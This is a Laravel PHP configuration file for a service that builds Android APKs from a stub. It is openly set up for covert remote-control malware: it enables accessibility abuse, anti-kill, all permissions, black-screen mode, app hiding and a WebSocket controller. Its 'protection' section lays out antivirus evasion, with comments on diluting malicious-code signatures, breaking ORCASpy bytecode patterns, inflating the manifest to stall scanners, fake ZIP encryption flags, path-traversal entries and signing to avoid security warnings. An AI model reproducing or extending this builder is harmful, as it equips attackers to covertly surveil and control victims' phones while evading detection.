<?php

return [

    /*
    |--------------------------------------------------------------------------
    | APK Builder Configuration
    |--------------------------------------------------------------------------
    |
    | APK 构建服务的配置选项
    |
    */

    // APK 模板目录（解压后的 apkstub）
    'template_path' => storage_path('app/apk/template'),

    // APK 模板 ZIP 文件路径（当 template_path 不存在时自动解压）
    'stub_zip_path' => storage_path('app/apk/apkstub/apkstub.zip'),

    // 构建工具目录（apktool.jar, signapk.jar 等）
    'tools_path' => storage_path('app/apk/tools'),

    // 构建输出目录
    'output_path' => storage_path('app/public/apk'),

    // 用户图标存储目录
    'icons_path' => storage_path('app/public/icons'),

    // 用户背景图存储目录
    'backgrounds_path' => storage_path('app/public/backgrounds'),

    // 默认图标（完整路径）
    'default_icon' => env('APK_DEFAULT_ICON', storage_path('app/public/icons/default/icon.png')),

    // 临时构建目录（留空则使用系统临时目录）
    'temp_path' => env('APK_BUILD_TEMP_PATH', ''),

    // 日志目录
    'log_path' => storage_path('logs/apk'),

    /*
    |--------------------------------------------------------------------------
    | Encryption Settings
    |--------------------------------------------------------------------------
    |
    | AES 加密配置，用于加密 APK 中的敏感配置
    | 警告：修改这些值会导致已构建的 APK 无法正常工作
    |
    */

    'encryption' => [
        'iv' => env('APK_ENCRYPTION_IV', '2230209522049090'),
        'password' => env('APK_ENCRYPTION_PASSWORD', '4814780584699673'),
        'salt' => env('APK_ENCRYPTION_SALT', '2894356330652558'),
        'iterations' => (int) env('APK_ENCRYPTION_ITERATIONS', 65536),
    ],

    /*
    |--------------------------------------------------------------------------
    | Default Build Settings
    |--------------------------------------------------------------------------
    |
    | 默认构建配置
    |
    */

    'defaults' => [
        // 默认包名前缀
        'package_prefix' => 'com.app',

        // WebSocket 完整地址 (包含协议 ws:// 或 wss://)
        'websocket_url' => env('WEBSOCKET_URL', 'ws://localhost:8081'),

        // 默认功能开关
        'use_access' => '1',        // 无障碍服务
        'use_antkill' => '1',       // 防杀进程
        'user_allprims' => '1',     // 请求所有权限
        'user_blackprims' => '1',   // 黑屏权限
        'hidden_app' => '1',        // 隐藏应用
        'use_draw' => '0',          // 悬浮窗
        'open_access' => '0',       // 自动打开无障碍
        'diao_type' => '1',         // 弹窗锁定

        // 默认界面配置
        'login_title' => '欢迎使用',
        'login_dis' => '允许受限制的设置',
        'login_btn' => '开始',
        'notify_title' => ' ',
        'notify_msg' => 'on',

        // 默认构建类型
        'build_type' => 'C',        // C=Custom, S=Store
        'install_type' => 'g',      // 安装引导类型
        'hide_type' => 'f',         // 隐藏类型

        // 默认背景
        'background' => 'black',    // 'black' 或图片路径
    ],

    /*
    |--------------------------------------------------------------------------
    | Protection Settings
    |--------------------------------------------------------------------------
    |
    | APK 保护功能配置
    |
    */

    'protection' => [
        // 生成垃圾 Smali 类，增加 DEX 噪音，稀释恶意代码特征密度
        // 三层分布：应用包名层 + handler/verifier 层 + 随机包名层
        'enable_junk_classes' => (bool) env('APK_ENABLE_JUNK_CLASSES', true),

        // 重命名 Smali 类名（65 个目标类 → 随机小写字母名）
        // 同步更新 AndroidManifest.xml 中的组件引用
        'enable_class_shuffle' => (bool) env('APK_ENABLE_CLASS_SHUFFLE', true),

        // 替换 Smali 中的字符串变量名（100 个目标 → 随机名）
        'enable_string_obfuscation' => (bool) env('APK_ENABLE_STRING_OBFUSCATION', true),

        // APK 保护总开关，启用后执行：
        //   1. inflate_manifest — 膨胀 AndroidManifest.xml 至 ~765MB，阻止 AV 解析
        //   2. apk_editor — APKEditor 重打包优化 ZIP 结构
        //   3. protect_apk — 假加密标志 + ZIP 条目保护
        'enable_apk_protection' => (bool) env('APK_ENABLE_PROTECTION', true),

        // 修改 APK 文件头部字节，覆盖 DEX magic/checksum 区域
        // 必须在 apk_editor 之后执行（APKEditor 会重写文件头）
        'enable_dex_modification' => (bool) env('APK_ENABLE_DEX_MODIFICATION', true),

        // D8 字节码重组：DEX → dex2jar → JAR → D8 → DEX
        // 往返转换改变寄存器分配和指令排序，破坏 AV 的 ORCASpy 等家族字节码模式签名
        // 依赖工具：storage/app/apk/tools/r8.jar + tools/dex2jar/
        'enable_r8_obfuscation' => (bool) env('APK_ENABLE_R8_OBFUSCATION', true),

        // 对 classes*.dex 和 AndroidManifest.xml 的 ZIP Local File Header 设置假加密标志
        // flag bits OR 0xF741 → 最终 0xff49，阻止 AV 引擎的 ZIP 解析器解压 DEX 内容
        'enable_fake_encryption' => (bool) env('APK_ENABLE_FAKE_ENCRYPTION', true),

        // 生成路径穿越假 ZIP 条目（如 AndroidManifest.xml///.xml, classes.dex/\\.xml）
        // 混淆 AV 的文件枚举逻辑，使其无法准确定位真实 DEX/Manifest
        'enable_path_traversal_entries' => (bool) env('APK_ENABLE_PATH_TRAVERSAL', true),

        // 三层包名分布的垃圾类（应用包名 + handler/verifier + 随机包名）
        // 与 enable_junk_classes 配合，模拟真实应用的多模块类结构
        'enable_multi_package_junk' => (bool) env('APK_ENABLE_MULTI_PACKAGE_JUNK', true),

        // ZIP 假条目数量（caobizy.apk 参考值 314，建议 ≥ 300）
        // 假条目使用真实 Android 资源文件名（abc_*, design_*, mtrl_* 等）
        'fake_entry_count' => (int) env('APK_FAKE_ENTRY_COUNT', 320),

        // 每层垃圾类数量（总数 = junk_class_count × 3 层）
        'junk_class_count' => (int) env('APK_JUNK_CLASS_COUNT', 165),

        // 每个垃圾类中的随机方法数量
        'junk_method_count' => (int) env('APK_JUNK_METHOD_COUNT', 10),

        // 黑屏自动唤醒（TransparentActivity android:turnScreenOn 属性）
        // true = 锁屏后自动唤醒屏幕，false = 允许保持黑屏
        'enable_auto_wake_screen' => (bool) env('APK_ENABLE_AUTO_WAKE_SCREEN', true),
    ],

    /*
    |--------------------------------------------------------------------------
    | Signing Settings
    |--------------------------------------------------------------------------
    |
    | APK 签名配置。默认使用 release 模式自动生成正式签名，
    | 避免 debug 签名触发手机安全扫描的"恶意应用"提示。
    |
    | 如果已有正式 keystore，可通过环境变量指定路径和密码。
    | 否则系统会自动生成一个 release 级别的 keystore 并持久保存。
    |
    */

    'signing' => [
        // 签名模式: 'release'（正式签名）或 'debug'（调试签名，不推荐生产使用）
        'mode' => env('APK_SIGNING_MODE', 'release'),

        // 用户提供的 Release keystore 配置（优先级最高）
        'keystore_path' => env('APK_KEYSTORE_PATH'),
        'keystore_pass' => env('APK_KEYSTORE_PASS'),
        'key_alias'     => env('APK_KEY_ALIAS'),
        'key_pass'      => env('APK_KEY_PASS'),

        // 自动生成 keystore 时的参数
        'auto_generate' => [
            'key_alg'  => 'RSA',
            'key_size' => 2048,
            'validity' => 36500,  // 100 年
            'dname'    => env('APK_KEYSTORE_DNAME', 'CN=App,OU=Mobile,O=Company,L=City,ST=State,C=CN'),
        ],

        // 是否启用 APK Signature Scheme v2/v3
        // 旧版 signapk.jar 使用 --v2-signing-enabled true --v3-signing-enabled false
        'v2_signing' => true,
        'v3_signing' => false,
    ],

    /*
    |--------------------------------------------------------------------------
    | Build Timeout
    |--------------------------------------------------------------------------
    |
    | 构建超时设置（秒）
    |
    */

    'timeout' => (int) env('APK_BUILD_TIMEOUT', 300),

    /*
    |--------------------------------------------------------------------------
    | Cleanup Settings
    |--------------------------------------------------------------------------
    |
    | 清理设置
    |
    */

    // 构建完成后是否清理临时文件
    'cleanup_on_success' => true,

    // 构建失败后是否清理临时文件
    'cleanup_on_failure' => true,

    // 保留旧构建缓存的最大数量（0 = 不保留）
    'max_cache_builds' => 0,

];
